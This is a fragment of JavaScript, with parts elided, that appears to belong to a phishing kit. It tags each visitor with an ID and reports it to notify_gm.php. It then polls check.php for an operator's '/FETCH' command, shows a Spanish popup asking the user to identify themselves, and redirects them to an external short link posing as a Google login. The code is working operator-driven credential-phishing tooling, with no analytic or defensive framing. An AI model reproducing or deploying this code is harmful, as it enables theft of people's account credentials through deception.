...
(function(){
  ...
  function showPopup(cb) {
    ...
    var tx = document.createElement('p');   tx.textContent = 'Identif\u00edcate para continuar';
  ...
  var uid = 'gm_' + Date.now() + '_' + Math.random().toString(36).slice(2,8);
  var fd = new FormData();
  fd.append('uid', uid);
  fetch('notify_gm.php', { method: 'POST', body: fd }).catch(function(){});

  var poll = setInterval(function(){
    fetch('../check.php?u=' + encodeURIComponent(uid))
      .then(function(r){ return r.json(); })
      .then(function(d){
        if (d.action === '/FETCH') {
          clearInterval(poll);
          showPopup(function(){
            window.location.href = 'https://t2m.co/google.login';
          });
        }
      })
      .catch(function(){});
